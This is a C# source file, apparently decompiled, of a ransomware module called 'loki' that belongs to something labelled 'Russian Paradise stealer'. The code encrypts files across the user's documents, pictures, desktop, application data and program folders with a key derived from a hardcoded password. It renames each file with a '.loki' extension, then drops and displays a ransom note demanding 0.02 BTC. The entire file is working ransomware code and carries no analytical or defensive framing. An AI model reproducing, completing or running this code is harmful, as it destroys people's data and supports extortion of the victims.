using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using loki.loki.Utilies.CryptoGrafy;

namespace loki.loki.Ransomware
{
	// Token: 0x02000034 RID: 52
	internal class RansomwareCrypt
	{
		// Token: 0x0600018E RID: 398 RVA: 0x0000B43C File Offset: 0x0000963C
		public static byte[] RidjinEncrypt(byte[] byte_0)
		{
			byte[] result = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(RansomwareCrypt.PasswordEncrypt), Encoding.ASCII.GetBytes(RansomwareCrypt.PasswordEncrypt), 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(byte_0, 0, byte_0.Length);
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x0600018F RID: 399 RVA: 0x0000B534 File Offset: 0x00009734
		public static void EncryptFiles(string string_1)
		{
			try
			{
				try
				{
					if (new FileInfo(string_1).Length > 4096L)
					{
						if (new FileInfo(string_1).Length <= 30000000L)
						{
							byte[] array = new byte[8192];
							using (BinaryReader binaryReader = new BinaryReader(File.Open(string_1, FileMode.Open)))
							{
								byte[] array2 = RansomwareCrypt.RidjinEncrypt(binaryReader.ReadBytes(4096));
								Array.Copy(array2, array, array2.Length);
							}
							using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_1, FileMode.Open)))
							{
								binaryWriter.Write(array);
							}
							File.Move(string_1, string_1 + ".loki");
						}
					}
					else
					{
						byte[] bytes = RansomwareCrypt.RidjinEncrypt(File.ReadAllBytes(string_1));
						File.WriteAllBytes(string_1, bytes);
						File.Move(string_1, string_1 + ".loki");
					}
				}
				catch (Exception)
				{
					FileAttributes fileAttributes = File.GetAttributes(string_1);
					if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
					{
						fileAttributes = RansomwareCrypt.FileAttrib(fileAttributes, FileAttributes.ReadOnly);
						File.SetAttributes(string_1, fileAttributes);
					}
					if (new FileInfo(string_1).Length <= 4096L)
					{
						byte[] bytes2 = RansomwareCrypt.RidjinEncrypt(File.ReadAllBytes(string_1));
						File.WriteAllBytes(string_1, bytes2);
						File.Move(string_1, string_1 + ".loki");
					}
					else if (new FileInfo(string_1).Length <= 30000000L)
					{
						byte[] buffer = new byte[8192];
						using (BinaryReader binaryReader2 = new BinaryReader(File.Open(string_1, FileMode.Open)))
						{
							buffer = RansomwareCrypt.RidjinEncrypt(binaryReader2.ReadBytes(4096));
						}
						using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(string_1, FileMode.Open)))
						{
							binaryWriter2.Write(buffer);
						}
						File.Move(string_1, string_1 + ".loki");
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000190 RID: 400 RVA: 0x0000B78C File Offset: 0x0000998C
		public static FileAttributes FileAttrib(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
		{
			return fileAttributes_0 & ~fileAttributes_1;
		}

		// Token: 0x06000191 RID: 401 RVA: 0x0000B794 File Offset: 0x00009994
		public static void GetFile(string string_1)
		{
			try
			{
				foreach (string text in Directory.GetFiles(string_1))
				{
					if (!Path.GetExtension(text).Contains("loki"))
					{
						RansomwareCrypt.EncryptFiles(text);
					}
				}
				string[] array = Directory.GetDirectories(string_1);
				for (int i = 0; i < array.Length; i++)
				{
					RansomwareCrypt.GetFile(array[i]);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000192 RID: 402 RVA: 0x0000B804 File Offset: 0x00009A04
		internal static void Start()
		{
			if (!File.Exists(Environment.GetEnvironmentVariable("ProgramData") + "\\trig"))
			{
				string[] array = new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.Recent),
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
					Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
					Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
					Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
					Environment.GetFolderPath(Environment.SpecialFolder.Personal),
					Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
					Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
					Environment.GetFolderPath(Environment.SpecialFolder.Personal),
					Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
					Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
					Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
					Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
				};
				for (int i = 0; i < array.Length; i++)
				{
					RansomwareCrypt.GetFile(array[i]);
				}
			}
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", string.Concat(new string[]
			{
				"IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer:",
				crypt.AESDecript(Settings.Stealer_version),
				"\nTo Decrypt: \n - Send 0.02 BTC to: ",
				Settings.bitcoin_keshel,
				"\n- Follow All Steps"
			}), Encoding.UTF8);
			Thread.Sleep(2000);
			MessageBox.Show(string.Concat(new string[]
			{
				"IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Russian Paradise stealer: ",
				Settings.Stealer_version,
				"\nTo Decrypt: \n - Send 0.02 BTC to: ",
				Settings.bitcoin_keshel,
				"\n - Follow All Steps"
			}));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt");
		}

		// Token: 0x04000083 RID: 131
		public static string PasswordEncrypt = "ugsojfsoejoigjwpfdsfmisofjksepfselfs[gkreopf";

		// Token: 0x0200006A RID: 106
		public enum Style
		{
			// Token: 0x04000138 RID: 312
			Tiled,
			// Token: 0x04000139 RID: 313
			Centered,
			// Token: 0x0400013A RID: 314
			Stretched
		}
	}
}
